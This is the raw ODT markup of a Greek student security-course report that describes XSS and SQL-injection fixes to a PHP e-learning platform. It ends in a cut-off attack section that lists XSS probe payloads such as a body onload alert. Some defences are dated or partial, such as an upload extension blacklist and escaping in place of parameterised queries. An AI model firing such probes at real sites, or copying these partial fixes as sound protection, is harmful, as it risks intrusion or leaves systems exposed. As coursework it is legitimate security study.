      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#cc3300" fo:letter-spacing="normal" fo:language="el" fo:country="GR" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0016d0a7" fo:background-color="transparent" loext:char-shading-value="0" style:font-name-asian="Calibri1" style:font-name-complex="Calibri1"/>
    </style:style>
    <style:style style:name="T56" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:letter-spacing="normal" fo:font-style="normal"/>
    </style:style>
    <style:style style:name="T57" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:letter-spacing="normal" fo:font-style="normal" officeooo:rsid="002805da"/>
    </style:style>
    <style:style style:name="T58" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:letter-spacing="normal" fo:language="en" fo:country="US" fo:font-style="normal"/>
    </style:style>
    <style:style style:name="T59" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:letter-spacing="normal" fo:language="en" fo:country="US" fo:font-style="normal" officeooo:rsid="002805da"/>
    </style:style>
    <style:style style:name="T60" style:family="text">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T61" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="003f12a6"/>
    </style:style>
    <style:style style:name="T62" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="0040061f"/>
    </style:style>
    <style:style style:name="T63" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="00404280"/>
    </style:style>
    <style:style style:name="T64" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="00422f69"/>
    </style:style>
    <style:style style:name="T65" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="00446d08"/>
    </style:style>
    <style:style style:name="T66" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="005867ef"/>
    </style:style>
    <style:style style:name="T67" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="005cfc5d"/>
    </style:style>
    <style:style style:name="T68" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="006540ff"/>
    </style:style>
    <style:style style:name="T69" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="00703407"/>
    </style:style>
    <style:style style:name="T70" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="00775b1d"/>
    </style:style>
    <style:style style:name="T71" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="007ad171"/>
    </style:style>
    <style:style style:name="T72" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="007bcc50"/>
    </style:style>
    <style:style style:name="T73" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="007d69a9"/>
    </style:style>
    <style:style style:name="T74" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="007e8a4f"/>
    </style:style>
    <style:style style:name="T75" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="008067a6"/>
    </style:style>
    <style:style style:name="T76" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="0083830e"/>
    </style:style>
    <style:style style:name="T77" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="00855858"/>
    </style:style>
    <style:style style:name="T78" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="0087375d"/>
    </style:style>
    <style:style style:name="T79" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="0089a908"/>
    </style:style>
    <style:style style:name="T80" style:family="text">
      <style:text-properties fo:language="el" fo:country="GR"/>
    </style:style>
    <style:style style:name="T81" style:family="text">
      <style:text-properties fo:language="el" fo:country="GR" officeooo:rsid="003517be"/>
    </style:style>
    <style:style style:name="T82" style:family="text">
      <style:text-properties fo:language="el" fo:country="GR" officeooo:rsid="0039d50a"/>
    </style:style>
    <style:style style:name="T83" style:family="text">
      <style:text-properties fo:language="el" fo:country="GR" officeooo:rsid="00404280"/>
    </style:style>
    <style:style style:name="T84" style:family="text">
      <style:text-properties fo:language="el" fo:country="GR" officeooo:rsid="00422f69"/>
    </style:style>
    <style:style style:name="T85" style:family="text">
      <style:text-properties fo:language="el" fo:country="GR" officeooo:rsid="00446d08"/>
    </style:style>
    <style:style style:name="T86" style:family="text">
      <style:text-properties fo:language="el" fo:country="GR" officeooo:rsid="005867ef"/>
    </style:style>
    <style:style style:name="T87" style:family="text">
      <style:text-properties fo:language="el" fo:country="GR" officeooo:rsid="005cfc5d"/>
    </style:style>
    <style:style style:name="T88" style:family="text">
      <style:text-properties fo:language="el" fo:country="GR" officeooo:rsid="005e6b7e"/>
    </style:style>
    <style:style style:name="T89" style:family="text">
      <style:text-properties fo:language="el" fo:country="GR" officeooo:rsid="00775b1d"/>
    </style:style>
    <style:style style:name="T90" style:family="text">
      <style:text-properties fo:font-size="44pt" style:font-size-asian="44pt" style:font-size-complex="44pt"/>
    </style:style>
    <style:style style:name="T91" style:family="text">
      <style:text-properties fo:font-size="44pt" fo:language="en" fo:country="US" officeooo:rsid="0032e442" style:font-size-asian="44pt" style:font-size-complex="44pt"/>
    </style:style>
    <style:style style:name="T92" style:family="text">
      <style:text-properties officeooo:rsid="00ac9e7f"/>
    </style:style>
    <style:style style:name="T93" style:family="text">
      <style:text-properties officeooo:rsid="0036286f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T94" style:family="text">
      <style:text-properties officeooo:rsid="003fc7a1"/>
    </style:style>
    <style:style style:name="T95" style:family="text">
      <style:text-properties officeooo:rsid="0040061f"/>
    </style:style>
    <style:style style:name="T96" style:family="text">
      <style:text-properties officeooo:rsid="004a8de9"/>
    </style:style>
    <style:style style:name="T97" style:family="text">
      <style:text-properties officeooo:rsid="0050277b"/>
    </style:style>
    <style:style style:name="T98" style:family="text">
      <style:text-properties officeooo:rsid="005867ef"/>
    </style:style>
    <style:style style:name="T99" style:family="text">
      <style:text-properties officeooo:rsid="005e6b7e"/>
    </style:style>
    <style:style style:name="T100" style:family="text">
      <style:text-properties officeooo:rsid="00703407"/>
    </style:style>
    <style:style style:name="T101" style:family="text">
      <style:text-properties style:font-name="Liberation Serif1" officeooo:rsid="005f8eab" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T102" style:family="text">
      <style:text-properties style:font-name="Liberation Serif1" officeooo:rsid="007aaba7" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T103" style:family="text">
      <style:text-properties style:font-name="Liberation Serif1" officeooo:rsid="007ad171" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T104" style:family="text">
      <style:text-properties style:font-name="Liberation Serif1" fo:language="en" fo:country="US" officeooo:rsid="005f8eab" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T105" style:family="text">
      <style:text-properties style:font-name="Liberation Serif1" fo:language="en" fo:country="US" officeooo:rsid="006a7062" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T106" style:family="text">
      <style:text-properties style:font-name="Liberation Serif1" fo:language="en" fo:country="US" officeooo:rsid="007aaba7" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T107" style:family="text">
      <style:text-properties officeooo:rsid="00775b1d"/>
    </style:style>
    <style:style style:name="T108" style:family="text">
      <style:text-properties officeooo:rsid="007ad171"/>
    </style:style>
    <style:style style:name="T109" style:family="text">
      <style:text-properties officeooo:rsid="007bcc50"/>
    </style:style>
    <style:style style:name="T110" style:family="text">
      <style:text-properties officeooo:rsid="007e8a4f"/>
    </style:style>
    <style:style style:name="T111" style:family="text">
      <style:text-properties officeooo:rsid="00835920"/>
    </style:style>
    <style:style style:name="T112" style:family="text">
      <style:text-properties officeooo:rsid="0083830e"/>
    </style:style>
    <style:style style:name="T113" style:family="text">
      <style:text-properties officeooo:rsid="00855858"/>
    </style:style>
    <style:style style:name="T114" style:family="text">
      <style:text-properties officeooo:rsid="00870cd7"/>
    </style:style>
    <style:style style:name="T115" style:family="text">
      <style:text-properties officeooo:rsid="0087375d"/>
    </style:style>
    <style:style style:name="T116" style:family="text">
      <style:text-properties officeooo:rsid="0089a9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9"/>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P35"><text:span text:style-name="T90">Project #</text:span><text:span text:style-name="T91">4</text:span> </text:p>
      <text:p text:style-name="P35"><text:span text:style-name="T90">ΥΣ13 ΕΑΡΙΝΟ 2016</text:span> </text:p>
      <text:p text:style-name="P38">Νικόλαος Ματθιουδάκης</text:p>
      <text:p text:style-name="P38">1115201200104</text:p>
      <text:p text:style-name="P36">Αλέξανδρος Λαποκωνσταντάκης</text:p>
      <text:p text:style-name="P36">1115201200088</text:p>
      <text:p text:style-name="P37">(<text:span text:style-name="T92">2</text:span>)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><text:soft-page-break/>DEFENCE</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P8">Dropbox - <text:span text:style-name="T61">Assignments</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P18"><text:span text:style-name="T94">Στο dropbox_submit.php, στη φόρμα ανταλλαγής αρχείου κα</text:span>θαρίστηκε το <text:span text:style-name="T60">input </text:span>των <text:span text:style-name="T60">authors </text:span>και του <text:span text:style-name="T60">description </text:span><text:span text:style-name="T62">ε</text:span><text:span text:style-name="T95">πειδή τα πεδία αυτά ήταν ευάλωτα σε </text:span><text:span text:style-name="T62">XSS</text:span><text:span text:style-name="T60">. </text:span><text:span text:style-name="T95">Τα πεδία των </text:span><text:span text:style-name="T62">authors, description, comments </text:span><text:span text:style-name="T95">και του t</text:span><text:span text:style-name="T62">itle </text:span><text:span text:style-name="T95">καθαρίστηκαν με τον ίδιο τρόπο και στο ανέβασμα εργασίας.</text:span>Οι 3 συναρτήσεις που χρησιμοποιήθηκαν εδώ και σε κάθε άλλη περίπτωση για <text:span text:style-name="T60">sanitize </text:span>ενάντια στις συγκεκριμένες επιθέσεις είναι <text:span text:style-name="T93">stripslashes(), mysql_real_escape_string(), htmlspecialchars().</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P12"><text:span text:style-name="T82">Το ίδιο έγινε και στο</text:span> dropbox_class.inc.php line 220.</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:span text:style-name="T83">Στο </text:span><text:span text:style-name="T63">dropbox_class.inc.php</text:span> <text:span text:style-name="T83">πραγματοποιούνται κάποια </text:span><text:span text:style-name="T63">queries </text:span><text:span text:style-name="T83">για τη διαπίστωση αν το αρχείο που πρόκειται ν’ ανεβεί υπάρχει ήδη, χρησιμοποιώντας την αδύναμη συνάρτηση </text:span><text:span text:style-name="T63">addslashes, </text:span><text:span text:style-name="T83">που μπορεί να παρακαμφθεί και να πραγματοποιηθεί </text:span><text:span text:style-name="T63">SQL injection</text:span><text:span text:style-name="T83">. Α</text:span>ντικαταστάθηκε <text:span text:style-name="T83">με την </text:span>mysql_real_escape_string.</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P59"><text:span text:style-name="T2">Για τις φόρμες ανταλλαγής αρχείων και ανεβάσματος εργασιών (</text:span><text:span text:style-name="T12">dropbox_submit.php, </text:span><text:span text:style-name="T16">work.php) </text:span><text:span text:style-name="T12">δ</text:span><text:span text:style-name="T18">ημιουργήσαμε</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T18">blacklist, </text:span><text:span text:style-name="T3">όχι τόσο αποτελεσματικό όσο ένα </text:span><text:span text:style-name="T18">whitelist, </text:span><text:span text:style-name="T3">αλλά δε θέλαμε να μειώσουμε τη λειτουργικότητα του </text:span><text:span text:style-name="T18">site, </text:span><text:span text:style-name="T1">απαγορεύο</text:span><text:span text:style-name="T3">ν</text:span><text:span text:style-name="T1">τα</text:span><text:span text:style-name="T3">ς</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">αρχεία</text:span><text:span text:style-name="T25"> .php, .html, .js, .css </text:span><text:span text:style-name="T27">έτσι</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">ώστε</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">να</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">μην</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">υπάρχει</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">εκτελέσιμος</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">κώδικας</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">από</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">τρίτους</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">ανεβασμένος</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">στην</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">πλατφόρμα</text:span><text:span text:style-name="T25"> (</text:span><text:span text:style-name="T27">για</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">εκτέλεση</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">στη</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">συνέχεια</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T26">XSS, <text:s/>CSRF </text:span><text:span text:style-name="T13">κτλ.</text:span><text:span text:style-name="T25">).</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P65"><text:span text:style-name="T25">Στο dropbox_submit.php (</text:span><text:span text:style-name="T15">line 206) </text:span><text:span text:style-name="T25">προσθέσαμε τη γραμμή chmod($dropbox_cnf["sysPath"] . '/' . $dropbox_filename, 644), αφού το αρχείο ανέβει στη βάση, έτσι ώστε να μην υπάρχουν εκτελέσιμα αρχεία τα οποία μπορούν να καλεστούν αργότερα.</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P28">Search bars</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P60"><text:span text:style-name="T27">Η</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">μόνη</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">ασφάλεια</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">που</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">χρησιμοποιείται</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">ενάντια</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">στο</text:span><text:span text:style-name="T25"> sqli </text:span><text:span text:style-name="T14">για την αναζήτηση μέσα σε μάθημα (modules/search/search_incourse.php) </text:span><text:span text:style-name="T27">είναι</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">η</text:span><text:span text:style-name="T25"> mysql_real_escape_string, </text:span><text:span text:style-name="T27">κατά</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">τ’</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">άλλα</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">δημιουργείται</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">ένα</text:span><text:span text:style-name="T25"> string </text:span><text:span text:style-name="T27">για</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">το</text:span><text:span text:style-name="T25"> query </text:span><text:span text:style-name="T27">που</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">περιέχει</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">και</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">κώδικα</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">και</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">την</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">τιμή</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">μεταβλητής</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">που</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">εκχωρήθηκε</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">με</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">το</text:span><text:span text:style-name="T25"> search, </text:span><text:span text:style-name="T27">οπότε</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">μπορεί</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">να</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">υπάρξει</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">πρόβλημα</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">με</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">μια</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">επίθεση</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">που</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">κάνει</text:span><text:span text:style-name="T25"> bypass </text:span><text:span text:style-name="T27">αυτό</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">το</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">μέτρο</text:span><text:span text:style-name="T25">. </text:span><text:span text:style-name="T27">Ο</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">κώδικας</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">διαχωρίστηκε</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">απ’</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">τις</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">μεταβλητές</text:span><text:span text:style-name="T25">, </text:span><text:span text:style-name="T27">για</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">κάθε</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">είδος</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">αναζήτησης</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">μέσα</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">σε</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">μάθημα</text:span><text:span text:style-name="T25"> (</text:span><text:span text:style-name="T27">ανακοινώσεις</text:span><text:span text:style-name="T25">, </text:span><text:span text:style-name="T27">αντζέντα</text:span><text:span text:style-name="T25">, </text:span><text:span text:style-name="T27">περιγραφή</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">μαθήματος</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">κτλ</text:span><text:span text:style-name="T25">). </text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P10"><text:span text:style-name="T84">Το ίδιο πρόβλημα υπήρχε και στα </text:span>modules/search/search_loggedin.php <text:s/>modules/search/search_loggedout.php<text:span text:style-name="T64">.</text:span></text:p>
      <text:p text:style-name="P58"><text:span text:style-name="T27">Μη</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">διαχωρισμένος</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">κώδικας</text:span><text:span text:style-name="T25">/</text:span><text:span text:style-name="T27">μεταβλητές</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">για</text:span><text:span text:style-name="T25"> search </text:span><text:span text:style-name="T27">χρησιμοποιούνταν</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">και</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">στο</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">γενικό</text:span><text:span text:style-name="T25"> search </text:span><text:span text:style-name="T27">του</text:span><text:span text:style-name="T25"> site, </text:span><text:span text:style-name="T27">οπότε</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">αλλάχτηκε</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">και</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">εκεί</text:span><text:span text:style-name="T25">. </text:span><text:span text:style-name="T27">Αν</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">και</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">οι</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">τιμές</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">των</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">μεταβλητών</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">για</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">τις</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">συνθήκες</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">που</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">χρησιμοποιούνται</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">στη</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">συγκεκριμένη</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">περίτπωση</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">δε</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">δίνονται</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">απευθείας</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">απ</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">το</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">χρήστη</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">κατα</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">το</text:span><text:span text:style-name="T25"> search, </text:span><text:span text:style-name="T27">είναι</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">καλή</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">πρακτική</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">ούτως</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">ή</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">άλλως</text:span><text:span text:style-name="T25">, </text:span><text:span text:style-name="T27">για</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">κάθε</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">ενδεχόμενο</text:span><text:span text:style-name="T25">.</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"><text:soft-page-break/>Login</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P58"><text:span text:style-name="T4">Στο </text:span><text:span text:style-name="T19">index.php </text:span><text:span text:style-name="T27">Για</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">το</text:span><text:span text:style-name="T25"> query </text:span><text:span text:style-name="T27">στο</text:span><text:span text:style-name="T25"> user table </text:span><text:span text:style-name="T27">όταν</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">δοθεί</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">το</text:span><text:span text:style-name="T25"> username </text:span><text:span text:style-name="T27">στο</text:span><text:span text:style-name="T25"> login </text:span><text:span text:style-name="T27">δε</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">χρησιμοποιείται</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">κάποιο</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">μέτρο</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">προστασίας</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">ενάντια</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">σε</text:span><text:span text:style-name="T25"> SQLi, </text:span><text:span text:style-name="T27">πέρα</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">απ’</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">το</text:span><text:span text:style-name="T25"> addslashes </text:span><text:span text:style-name="T27">που</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">μπορεί</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">να</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">παρακαμφθεί</text:span><text:span text:style-name="T25">. </text:span><text:span text:style-name="T27">Το</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">αλλάξαμε</text:span><text:span text:style-name="T25">, </text:span><text:span text:style-name="T27">διαχωρίζοντας</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">το</text:span><text:span text:style-name="T25"> mySql </text:span><text:span text:style-name="T27">κώδικα</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">και</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">τη</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">μεταβλητή</text:span><text:span text:style-name="T25"> username, </text:span><text:span text:style-name="T27">έτσι</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">ώστε</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">να</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">μη</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">μπορεί</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">να</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">γίνει</text:span><text:span text:style-name="T25"> injection </text:span><text:span text:style-name="T27">προσθέτοντας</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">νέες</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">εντολές</text:span><text:span text:style-name="T25">, <text:s/></text:span><text:span text:style-name="T27">και</text:span><text:span text:style-name="T25"> </text:span><text:span text:style-name="T27">κάναμε</text:span><text:span text:style-name="T25"> sanitize </text:span><text:span text:style-name="T27">το</text:span><text:span text:style-name="T25"> input.</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P66"><text:span text:style-name="T25">Στο </text:span><text:span text:style-name="T15">p</text:span><text:span text:style-name="T25">assword.php διορθώθηκε το ίδιο πρόβλημα κατά το </text:span><text:span text:style-name="T15">query </text:span><text:span text:style-name="T25">που γινόταν πάνω στα </text:span><text:span text:style-name="T15">passwords, </text:span><text:span text:style-name="T25">έτσι ώστε να βρεθεί αυτο που ανιστοιχεί στο </text:span><text:span text:style-name="T15">user </text:span><text:span text:style-name="T25">που προσπαθούσε να κάνει </text:span><text:span text:style-name="T15">login.</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P29">Forum</text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P21">Στο phpbb/newtopic και <text:span text:style-name="T60">phpbb/reply</text:span> καθαρίζουμε το <text:span text:style-name="T60">input </text:span>για να μην είναι δυνατόν να τρέξει <text:span text:style-name="T60">XSS </text:span>ή <text:span text:style-name="T60">HTML events </text:span>κατά τη δημιουργία νέου <text:span text:style-name="T60">topic </text:span>και <text:span text:style-name="T60">post reply, </text:span>που ήταν ευάλωτα.</text:p>
      <text:p text:style-name="P19">Για την επιλογή να γράψεις <text:span text:style-name="T60">HTML </text:span>κώδικα απενεργοποιήσαμε όλες τις δυνατότητες <text:span text:style-name="T60">tags </text:span>(πχ <text:span text:style-name="T60">&lt;script&gt;) </text:span>εκτός απ του <text:span text:style-name="T60">link, </text:span>θεωρώντας ότι θα αφαιρούσε απ’ τη λειτουργία για την οποία ήταν προορισμένη <text:span text:style-name="T96">αν το απενεργοποιούσαμε εντελώς.</text:span></text:p>
      <text:p text:style-name="P20">Επίσης στο <text:span text:style-name="T60">phpbb/editpost.php </text:span>κατά το <text:span text:style-name="T60">edit </text:span>του μηνύματος χρησιμοποιούνταν δύο συναρτήσεις οι οποίες επανέφεραν τη δυνατότητα να τρέξεις κάποιο <text:span text:style-name="T60">script </text:span><text:span text:style-name="T97">(undo_make_clickable($message), undo_htmlspecialchars($message))</text:span><text:span text:style-name="T60">, </text:span>αν είχε ήδη αποθηκευθεί στο <text:span text:style-name="T60">forum, </text:span>ακόμα κι αν το <text:span text:style-name="T60">input </text:span>είχε προηγουμένως καθαριστεί, οπότε τις σχολιάσαμε.</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P32">ATTACK</text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P27">Τηλεσυνεργασία</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:span text:style-name="T81">Δοκιμάσαμε</text:span> <text:span text:style-name="T85">να τρέξουμε </text:span><text:span text:style-name="T65">XSS </text:span><text:span text:style-name="T85">με </text:span>&lt;script&gt; &lt;/script&gt; <text:span text:style-name="T85">και</text:span> html events &lt;body onload="alert(2)" &gt;body&gt;&lt;/body&gt; <text:span text:style-name="T85">στην καταχώρηση του μηνύματος</text:span> <text:s/><text:span text:style-name="T81">χωρίς αποτέλεσμα,</text:span> <text:span text:style-name="T81">φαίνεται ασφαλισμένο.</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P31">Forum</text:p>
      <text:p text:style-name="P12"/>
